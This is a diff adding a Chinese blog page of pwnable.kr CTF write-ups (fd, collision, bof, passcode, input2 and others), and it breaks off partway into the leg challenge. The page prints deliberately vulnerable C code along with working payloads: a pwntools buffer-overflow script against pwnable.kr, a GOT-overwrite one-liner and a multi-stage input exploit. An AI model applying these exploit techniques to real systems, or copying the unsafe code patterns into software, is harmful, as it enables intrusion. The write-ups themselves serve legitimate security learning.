@@ -1,0 +1,1851 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="a1oyss" href="https://a1oyss.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="a1oyss" href="https://a1oyss.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="a1oyss" href="https://a1oyss.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="CTF,PWN" />
+
+
+<link rel="canonical" href="https://a1oyss.github.io/CTF/Pwnable%E9%A2%98%E8%A7%A3/">
+
+
+
+  <title>
+Pwnable题解 - CTF |
+a1oyss's blog = a1oyss</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Pwnable题解
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2020-12-23 11:11:41">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2020-12-23T11:11:41+08:00">2020-12-23</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">a1oyss's blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/o48DpbILlyrJ6OU.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/as8YPCQ37LcqDVX.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/Ts5D4aIMSQgekmz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/mOGLsCI7qPDTVfx.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/FpBugrl5cIRPQAn.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/Upk9JAeHw1fGzC3.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://a1oyss.github.io/CTF/Pwnable%E9%A2%98%E8%A7%A3/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="a1oyss">
+    <meta itemprop="description" content=", 随便写点什么">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="a1oyss">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>#CTF #PWN</p>
+<h1 id="toddlers-bottle"><a class="markdownIt-Anchor" href="#toddlers-bottle">#</a> Toddler’s Bottle</h1>
+<h2 id="fd"><a class="markdownIt-Anchor" href="#fd">#</a> fd</h2>
+<h3 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述">#</a> 题目描述</h3>
+<p>Mommy! what is a file descriptor in Linux?</p>
+<ul>
+<li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:<br>
+<span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS85NzFlWmhNSFFRdw==">https://youtu.be/971eZhMHQQw</span></li>
+</ul>
+<p>ssh <span class="exturl" data-url="bWFpbHRvOmZkQHB3bmFibGUua3I=">fd@pwnable.kr</span> -p2222 (pw:guest)</p>
+<h3 id="题目解析"><a class="markdownIt-Anchor" href="#题目解析">#</a> 题目解析</h3>
+<p>先了解下 fd 是什么东西</p>
+<p>fd (file descriptor)，文件描述符</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODYlODUlRTYlQTAlQjgvMTA4NDEw">内核</span>（kernel）利用文件描述符（file descriptor）来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>
+<p>习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。</p>
+<p>ssh 连接上题目，查看题目代码</p>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+#include &lt;string.h&gt;<br>
+char buf[32];<br>
+int main(int argc, char* argv[], char* envp[]){<br>
+if(argc&lt;2){<br>
+printf(“pass argv[1] a number\n”);<br>
+return 0;<br>
+}<br>
+int fd = atoi( argv[1] ) - 0x1234;<br>
+int len = 0;<br>
+len = read(fd, buf, 32);<br>
+if(!strcmp(“LETMEWIN\n”, buf)){<br>
+printf(“good job 😃\n”);<br>
+system(&quot;/bin/cat flag&quot;);<br>
+exit(0);<br>
+}<br>
+printf(“learn about Linux file IO\n”);<br>
+return 0;</p>
+<p>}</p>
+<p>令 fd 为 0 (stdin)，再输入 LETMEWIN 就可以得到 flag。</p>
+<p><strong>payload</strong></p>
+<p>./fd 4660<br>
+input：LETMEWIN</p>
+<h2 id="collision"><a class="markdownIt-Anchor" href="#collision">#</a> collision</h2>
+<h3 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2">#</a> 题目描述</h3>
+<p>Daddy told me about cool MD5 hash collision today.</p>
+<p>I wanna do something like that too!</p>
+<p>ssh <span class="exturl" data-url="bWFpbHRvOmNvbEBwd25hYmxlLmty">col@pwnable.kr</span> -p2222 (pw:guest)</p>
+<h3 id="题目解析-2"><a class="markdownIt-Anchor" href="#题目解析-2">#</a> 题目解析</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;string.h&gt;<br>
+unsigned long hashcode = 0x21DD09EC;<br>
+unsigned long check_password(const char* p){<br>
+int* ip = (int*)p;<br>
+int i;<br>
+int res=0;<br>
+for(i=0; i&lt;5; i++){<br>
+res += ip[i];<br>
+}<br>
+return res;<br>
+}</p>
+<p>int main(int argc, char* argv[]){<br>
+if(argc&lt;2){<br>
+printf(“usage:%s [passcode]\n”, argv[0]);<br>
+return 0;<br>
+}<br>
+if(strlen(argv[1]) != 20){<br>
+printf(“passcode length should be 20 bytes\n”);<br>
+return 0;<br>
+}</p>
+<pre><code>    if(hashcode == check_password( argv[1] ))&#123;
+            system(&quot;/bin/cat flag&quot;);
+            return 0;
+    &#125;
+    else
+            printf(&quot;wrong passcode.\n&quot;);
+    return 0;
+</code></pre>
+<p>}</p>
+<p><code>check_password</code>  将 <code>char*</code>  强制转换为 <code>int*</code> ，也就是将输入的数据分为 4 个字节一组，5 组数据相加最后的结果要等于 <code>0x21DD09EC</code></p>
+<p><code>0x21DD09EC/5 = 0x6C5CEC9 * 4 + 0x6C5CEC8</code></p>
+<p><strong>payload</strong></p>
+<p>./col  <code>python -c 'print &quot;\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06&quot;'</code></p>
+<h2 id="bof"><a class="markdownIt-Anchor" href="#bof">#</a> bof</h2>
+<h3 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;string.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+void func(int key){<br>
+char overflowme[32];<br>
+printf(“overflow me:”);<br>
+gets(overflowme);	// smash me!<br>
+if(key == 0xcafebabe){<br>
+system(&quot;/bin/sh&quot;);<br>
+}<br>
+else{<br>
+printf(“Nah…\n”);<br>
+}<br>
+}<br>
+int main(int argc, char* argv[]){<br>
+func(0xdeadbeef);<br>
+return 0;<br>
+}</p>
+<h3 id="题目解析-3"><a class="markdownIt-Anchor" href="#题目解析-3">#</a> 题目解析</h3>
+<p>很明显的栈溢出，将 key 的值覆盖为 <code>0xCAFEBABE</code>  就可以了</p>
+<p><strong>payload</strong></p>
+<p>from pwn import *<br>
+context.log_level=‘debug’</p>
+<p>p=remote(“<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>”,9000)<br>
+#print p.recvline()<br>
+payload=‘a’*52<br>
+payload+=p64(0xCAFEBABE)<br>
+p.sendline(payload)</p>
+<p>p.interactive()</p>
+<h2 id="flag"><a class="markdownIt-Anchor" href="#flag">#</a> flag</h2>
+<h3 id="题目描述-4"><a class="markdownIt-Anchor" href="#题目描述-4">#</a> 题目描述</h3>
+<p>虽然在 pwnable 上面，但是是一道逆向题</p>
+<p>Papa brought me a packed present! let’s open it.</p>
+<p>Download:<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3IvYmluL2ZsYWc=">http://pwnable.kr/bin/flag</span></p>
+<p>This is reversing task. all you need is binary</p>
+<h3 id="题目解析-4"><a class="markdownIt-Anchor" href="#题目解析-4">#</a> 题目解析</h3>
+<p>刚拿到就直接放进了 ida 中，结果只显示 4 个函数，并且有的还无法 F5。后来看了 wp 才知道程序被 upx 压缩过了</p>
+<p><code>upx -d flag</code>  解压缩，ida 分析程序</p>
+<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
+{<br>
+char *dest; // ST08_8</p>
+<p>puts((__int64)“I will malloc() and strcpy the flag there. take it.”);<br>
+dest = (char *)malloc(100LL);<br>
+strcpy(dest, flag);<br>
+return 0;<br>
+}</p>
+<p>非常简单的逻辑，把 flag 复制到 dest 中，查看 flag 处的数据即可</p>
+<h2 id="passcode"><a class="markdownIt-Anchor" href="#passcode">#</a> passcode</h2>
+<h3 id="题目描述-5"><a class="markdownIt-Anchor" href="#题目描述-5">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;stdlib.h&gt;</p>
+<p>void login(){<br>
+int passcode1;<br>
+int passcode2;</p>
+<pre><code>    printf(&quot;enter passcode1:&quot;);
+    scanf(&quot;%d&quot;, passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf(&quot;enter passcode2:&quot;);
+    scanf(&quot;%d&quot;, passcode2);
+
+    printf(&quot;checking...\n&quot;);
+    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;
+            printf(&quot;Login OK!\n&quot;);
+            system(&quot;/bin/cat flag&quot;);
+    &#125;
+    else&#123;
+            printf(&quot;Login Failed!\n&quot;);
+            exit(0);
+    &#125;
+</code></pre>
+<p>}</p>
+<p>void welcome(){<br>
+char name[100];<br>
+printf(“enter you name:”);<br>
+scanf(&quot;%100s&quot;, name);<br>
+printf(“Welcome %s!\n”, name);<br>
+}</p>
+<p>int main(){<br>
+printf(“Toddler’s Secure Login System 1.0 beta.\n”);</p>
+<pre><code>    welcome();
+    login();
+
+    // something after login...
+    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
+    return 0;
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-5"><a class="markdownIt-Anchor" href="#题目解析-5">#</a> 题目解析</h3>
+<p>login 函数中的两个 scanf 的参数没有加 &amp;，但是 scanf 依然会把 passcode1 和 passcode2 当成指针来存储数据，也就是说此时输入的数据应该在 passcode1 和 passcode2 中的值所指向的地址里面。</p>
+<p>如果将 passcode1 或 passcode2 里面的值覆盖为某个函数的地址，构造好栈的布局，参数为 <code>system(&quot;/bin/cat flag&quot;)</code>  的地址，那么 scanf 就会将 <code>system(&quot;/bin/cat flag&quot;)</code>  的地址覆盖到原本的函数地址上去，然后得到 flag。</p>
+<p>接下来就需要计算 name 到 passcode 的长度</p>
+<p>gdb 反汇编分析，只看关键部分</p>
+<p>welcome:<br>
+0x0804862f &lt;+38&gt;:    lea    -0x70 (% ebp),% edx	;name 的地址<br>
+ 0x08048632 &lt;+41&gt;:    mov    % edx,0x4 (% esp)<br>
+0x08048636 &lt;+45&gt;:    mov    %eax,(%esp)<br>
+0x08048639 &lt;+48&gt;:    call   0x80484a0 <span class="exturl" data-url="bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==">__isoc99_scanf@plt</span></p>
+<p>login:<br>
+passcode1:<br>
+0x0804857c &lt;+24&gt;:    mov    -0x10 (% ebp),% edx	;passcode1 的地址<br>
+ 0x0804857f &lt;+27&gt;:    mov    % edx,0x4 (% esp)<br>
+0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)<br>
+0x08048586 &lt;+34&gt;:    call   0x80484a0 <span class="exturl" data-url="bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==">__isoc99_scanf@plt</span><br>
+passcode2:<br>
+0x080485aa &lt;+70&gt;:    mov    -0xc (% ebp),% edx	;passcode2 的地址<br>
+ 0x080485ad &lt;+73&gt;:    mov    % edx,0x4 (% esp)<br>
+0x080485b1 &lt;+77&gt;:    mov    %eax,(%esp)<br>
+0x080485b4 &lt;+80&gt;:    call   0x80484a0 <span class="exturl" data-url="bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==">__isoc99_scanf@plt</span><br>
+system_getflag:<br>
+0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)<br>
+0x080485ea &lt;+134&gt;:   call   0x8048460 <span class="exturl" data-url="bWFpbHRvOnN5c3RlbUBwbHQ=">system@plt</span></p>
+<p>通过计算可知，name 到 passcode1 的长度为 96 字节，name 的长度为 100，刚好可以溢出覆盖 passcode1。</p>
+<p>接着查看 plt 表，因为只够覆盖到 passcode1，所以选择 fflush 函数</p>
+<p><strong>payload</strong></p>
+<p>python -c “print ‘A’ * 96 + ‘\x00\xa0\x04\x08’ + ‘134514147\n’” | ./passcode</p>
+<h2 id="random"><a class="markdownIt-Anchor" href="#random">#</a> random</h2>
+<h3 id="题目描述-6"><a class="markdownIt-Anchor" href="#题目描述-6">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;</p>
+<p>int main(){<br>
+unsigned int random;<br>
+random = rand();	// random value!</p>
+<pre><code>unsigned int key=0;
+scanf(&quot;%d&quot;, &amp;key);
+
+if( (key ^ random) == 0xdeadbeef )&#123;
+	printf(&quot;Good!\n&quot;);
+	system(&quot;/bin/cat flag&quot;);
+	return 0;
+&#125;
+
+printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);
+return 0;
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-6"><a class="markdownIt-Anchor" href="#题目解析-6">#</a> 题目解析</h3>
+<p>观察代码，令 <code>key^random</code>  的值等于 <code>0xdeadbeef</code>  就可以得到 flag。刚开始以为是栈溢出，但是 <code>scanf(&quot;%d&quot;,&amp;key)</code>  只会读取 4 个字节，不够覆盖 random。</p>
+<p>调试了几次发现 random 每次的值都一样，那么只需要将 <code>0xdeadbeef</code>  与 random 异或就可以得到 key 的值，最后输入 key 的时候要先把 key 转为 10 进制，因为 scanf 的格式化字符串是 % d。</p>
+<p>关于为什么 random 每次的值都一样</p>
+<p>rand<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODclQkQlRTYlOTUlQjA="> 函数</span>不是真正的随机数生成器，而 srand () 会设置供 rand () 使用的随机数种子。如果你在第一次调用 rand () 之前没有调用 srand ()，那么系统会为你自动调用 srand ()。如果用户在此之前没有调用过 srand (seed)，它会自动调用 srand (1) 一次。而使用同种子相同的数调用 rand () 会导致相同的<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUElOEYlRTYlOUMlQkE=">随机</span>数序列被生成。</p>
+<h2 id="input2"><a class="markdownIt-Anchor" href="#input2">#</a> input2</h2>
+<h3 id="题目描述-7"><a class="markdownIt-Anchor" href="#题目描述-7">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+#include &lt;string.h&gt;<br>
+#include &lt;sys/socket.h&gt;<br>
+#include &lt;arpa/inet.h&gt;</p>
+<p>int main(int argc, char* argv[], char* envp[]){<br>
+printf(“Welcome to <span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>\n”);<br>
+printf(“Let’s see if you know how to give input to program\n”);<br>
+printf(“Just give me correct inputs then you will get the flag 😃\n”);</p>
+<pre><code>// argv
+if(argc != 100) return 0;
+if(strcmp(argv['A'],&quot;\x00&quot;)) return 0;
+if(strcmp(argv['B'],&quot;\x20\x0a\x0d&quot;)) return 0;
+printf(&quot;Stage 1 clear!\n&quot;);	
+
+// stdio
+char buf[4];
+read(0, buf, 4);
+if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;
+read(2, buf, 4);
+    if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;
+printf(&quot;Stage 2 clear!\n&quot;);
+
+// env
+if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;
+printf(&quot;Stage 3 clear!\n&quot;);
+
+// file
+FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);
+if(!fp) return 0;
+if( fread(buf, 4, 1, fp)!=1 ) return 0;
+if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;
+fclose(fp);
+printf(&quot;Stage 4 clear!\n&quot;);	
+
+// network
+int sd, cd;
+struct sockaddr_in saddr, caddr;
+sd = socket(AF_INET, SOCK_STREAM, 0);
+if(sd == -1)&#123;
+	printf(&quot;socket error, tell admin\n&quot;);
+	return 0;
+&#125;
+saddr.sin_family = AF_INET;
+saddr.sin_addr.s_addr = INADDR_ANY;
+saddr.sin_port = htons( atoi(argv['C']) );
+if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;
+	printf(&quot;bind error, use another port\n&quot;);
+		return 1;
+&#125;
+listen(sd, 1);
+int c = sizeof(struct sockaddr_in);
+cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);
+if(cd &lt; 0)&#123;
+	printf(&quot;accept error, tell admin\n&quot;);
+	return 0;
+&#125;
+if( recv(cd, buf, 4, 0) != 4 ) return 0;
+if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;
+printf(&quot;Stage 5 clear!\n&quot;);
+
+// here's your flag
+system(&quot;/bin/cat flag&quot;);	
+return 0;
+</code></pre>
+<p>}</p>
+<p>题目总共有五关，需要依次通过，pwntools 完美解决。</p>
+<h3 id="题目解析-7"><a class="markdownIt-Anchor" href="#题目解析-7">#</a> 题目解析</h3>
+<h4 id="stage-1-argv"><a class="markdownIt-Anchor" href="#stage-1-argv">#</a> stage 1 argv</h4>
+<p>if(argc != 100) return 0;<br>
+if(strcmp(argv[‘A’],&quot;\x00&quot;)) return 0;<br>
+if(strcmp(argv[‘B’],&quot;\x20\x0a\x0d&quot;)) return 0;<br>
+printf(“Stage 1 clear!\n”);</p>
+<p>第一关要求给出 100 个参数，并且第’A’（65）个和第’B’（66）个分别是 <code>\x00</code>  和 <code>\x20\x0a\x0d</code> 。</p>
+<p>构造 list，一般情况，argv [0] 是 <code>&quot;./input&quot;</code> ，也就是程序名</p>
+<p>argv = list(‘1’ * 100)<br>
+argv[0] = “./input”<br>
+argv[ord(‘A’)] = “\x00”<br>
+argv[ord(‘B’)] = “\x20\x0a\x0d”</p>
+<h4 id="stage-2-stdio"><a class="markdownIt-Anchor" href="#stage-2-stdio">#</a> stage 2 stdio</h4>
+<p>char buf[4];<br>
+read(0, buf, 4);<br>
+if(memcmp(buf, “\x00\x0a\x00\xff”, 4)) return 0;<br>
+read(2, buf, 4);<br>
+if(memcmp(buf, “\x00\x0a\x02\xff”, 4)) return 0;<br>
+printf(“Stage 2 clear!\n”);</p>
+<p>第一个 <code>memcmp</code>  从 stdin 中读取数据，与 <code>\x00\x0a\x00\xff</code>  进行对比，第二个 <code>memcmp</code>  从 stderr 中读取数据进行对比。</p>
+<p>pwntools 中的 process 有 2 个参数，stdin 和 stderr，传入文件对象即可。</p>
+<p>with open(“stdin.txt”, “wb”) as file:<br>
+file.write(&quot;\x00\x0a\x00\xff&quot;)<br>
+file.close()<br>
+with open(“stderr.txt”, “wb”) as file:<br>
+file.write(&quot;\x00\x0a\x02\xff&quot;)<br>
+file.close()</p>
+<h4 id="stage-3-env"><a class="markdownIt-Anchor" href="#stage-3-env">#</a> stage 3 env</h4>
+<p>if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;<br>
+printf(“Stage 3 clear!\n”);</p>
+<p>依旧使用 process 中的 env 参数，env 是字典形式。</p>
+<p \xde\xad\xbe\xef:\xca\xfe\xba\xbe="">env =</p>
+<h4 id="stage-4-file"><a class="markdownIt-Anchor" href="#stage-4-file">#</a> stage 4 file</h4>
+<p>FILE* fp = fopen(&quot;\x0a&quot;, “r”);<br>
+if(!fp) return 0;<br>
+if( fread(buf, 4, 1, fp)!=1 ) return 0;<br>
+if( memcmp(buf, “\x00\x00\x00\x00”, 4) ) return 0;<br>
+fclose(fp);<br>
+printf(“Stage 4 clear!\n”);</p>
+<p>这一关很简单，创建个名字为 <code>\x0a</code>  的文件，内容为 <code>\x00\x00\x00\x00</code></p>
+<p>with open(&quot;\x0a&quot;, “wb”) as file:<br>
+file.write(&quot;\x00\x00\x00\x00&quot;)<br>
+file.close()</p>
+<h4 id="stage-5-network"><a class="markdownIt-Anchor" href="#stage-5-network">#</a> stage 5 network</h4>
+<p>int sd, cd;<br>
+struct sockaddr_in saddr, caddr;<br>
+sd = socket(AF_INET, SOCK_STREAM, 0);<br>
+if(sd == -1){<br>
+printf(“socket error, tell admin\n”);<br>
+return 0;<br>
+}<br>
+saddr.sin_family = AF_INET;<br>
+saddr.sin_addr.s_addr = INADDR_ANY;<br>
+saddr.sin_port = htons( atoi(argv[‘C’]) );<br>
+if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){<br>
+printf(“bind error, use another port\n”);<br>
+return 1;<br>
+}<br>
+listen(sd, 1);<br>
+int c = sizeof(struct sockaddr_in);<br>
+cd = accept(sd, (struct sockaddr <em>)&amp;caddr, (socklen_t</em>)&amp;c);<br>
+if(cd &lt; 0){<br>
+printf(“accept error, tell admin\n”);<br>
+return 0;<br>
+}<br>
+if( recv(cd, buf, 4, 0) != 4 ) return 0;<br>
+if(memcmp(buf, “\xde\xad\xbe\xef”, 4)) return 0;<br>
+printf(“Stage 5 clear!\n”);</p>
+<p>这一关是建立一个 socket 来接受数据，与 <code>\xde\xad\xbe\xef</code>  进行比较。</p>
+<p>其中需要注意这两句</p>
+<p>saddr.sin_addr.s_addr = INADDR_ANY;<br>
+saddr.sin_port = htons( atoi(argv[‘C’]) );</p>
+<p>第一句指定绑定的地址， <code>INADDR_ANY</code>  事实上表示不确定地址，或 “所有地址”、“任意地址”， <code>127.0.0.1</code>  当然也包含在内，第二句指定绑定端口，端口号就是 argv [‘C’] 的内容，因为 argv 是我们自己设置的，所以只要设置一个不与其他程序冲突的端口号就行。</p>
+<p>直接使用 pwntools 的 remote</p>
+<p>r = remote(“127.0.0.1”, 9999)<br>
+r.send(&quot;\xde\xad\xbe\xef&quot;)</p>
+<p><strong>payload</strong></p>
+<p>from pwn import *</p>
+<h1 id="stage-1-process"><a class="markdownIt-Anchor" href="#stage-1-process">#</a> stage 1 process</h1>
+<p>argv = list(‘1’ * 100)<br>
+argv[0] = “./input”<br>
+argv[ord(‘A’)] = “\x00”<br>
+argv[ord(‘B’)] = “\x20\x0a\x0d”</p>
+<h1 id="stage-2-stdio-2"><a class="markdownIt-Anchor" href="#stage-2-stdio-2">#</a> stage 2 stdio</h1>
+<p>with open(“stdin.txt”, “wb”) as file:<br>
+file.write(&quot;\x00\x0a\x00\xff&quot;)<br>
+file.close()<br>
+with open(“stderr.txt”, “wb”) as file:<br>
+file.write(&quot;\x00\x0a\x02\xff&quot;)<br>
+file.close()</p>
+<h1 id="stage-3-env-2"><a class="markdownIt-Anchor" href="#stage-3-env-2">#</a> stage 3 env</h1>
+<p \xde\xad\xbe\xef:\xca\xfe\xba\xbe="">env =</p>
+<h1 id="stage-4-file-2"><a class="markdownIt-Anchor" href="#stage-4-file-2">#</a> stage 4 file</h1>
+<p>with open(&quot;\x0a&quot;, “wb”) as file:<br>
+file.write(&quot;\x00\x00\x00\x00&quot;)<br>
+file.close()</p>
+<h1 id="stage-5-network-2"><a class="markdownIt-Anchor" href="#stage-5-network-2">#</a> stage 5 network</h1>
+<p>argv[ord(‘C’)] = “9999”</p>
+<p>p = process(argv=argv, env=env, stdin=open(“stdin.txt”,“rb”), stderr=open(“stderr.txt”,“rb”))<br>
+r = remote(“127.0.0.1”, 9999)<br>
+r.send(&quot;\xde\xad\xbe\xef&quot;)<br>
+r.close()</p>
+<p>print p.recv()<br>
+print p.recv()</p>
+<h2 id="leg"><a class="markdownIt-Anchor" href="#leg">#</a> leg</h2>
+<h3 id="题目描述-8"><a class="markdownIt-Anchor" href="#题目描述-8">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;fcntl.h&gt;<br>
+int key1(){<br>
+asm(“mov r3, pc\n”);<br>
+}<br>
+int key2(){<br>
+asm(<br>
+“push	{r6}\n”<br>
+“add	r6, pc, $1\n”<br>
+“bx	r6\n”<br>
+“.code   16\n”<br>
+“mov	r3, pc\n”<br>
+“add	r3, $0x4\n”<br>
+“push	{r3}\n”<br>
+“pop	{pc}\n”<br>
+“.code	32\n”<br>
+“pop	{r6}\n”<br>
+);<br>
+}<br>
+int key3(){<br>
+asm(“mov r3, lr\n”);<br>
+}<br>
+int main(){<br>
+int key=0;<br>
+printf(“Daddy has very strong arm!:”);<br>
+scanf(&quot;%d&quot;, &amp;key);<br>
+if( (key1()+key2()+key3()) == key ){<br>
+printf(“Congratz!\n”);<br>
+int fd = open(“flag”, O_RDONLY);<br>
+char buf[100];<br>
+int r = read(fd, buf, 100);<br>
+write(0, buf, r);<br>
+}<br>
+else{<br>
+printf(“I have strong leg 😛\n”);<br>
+}<br>
+return 0;<br>
+}</p>
+<h3 id="题目解析-8"><a class="markdownIt-Anchor" href="#题目解析-8">#</a> 题目解析</h3>
+<p>第 27 行中 <code>if( (key1()+key2()+key3()) == key )</code>  显示 key 的值为 <code>key1()+key2()+key3()</code>  的总和，相等即可得到 flag。</p>
+<p>源码中的看不懂，直接去看反汇编中的部分代码。</p>
+<p>(gdb) disass key1<br>
+Dump of assembler code for function key1:<br>
+0x00008cd4 &lt;+0&gt;:		push	{r11}		; (str r11, [sp, #-4]!)<br>
+0x00008cd8 &lt;+4&gt;:		add	r11, sp, #0<br>
+0x00008cdc &lt;+8&gt;:		mov	r3, pc<br>
+0x00008ce0 &lt;+12&gt;:	mov	r0, r3<br>
+0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0<br>
+0x00008ce8 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)<br>
+0x00008cec &lt;+24&gt;:	bx	lr<br>
+End of assembler dump.</p>
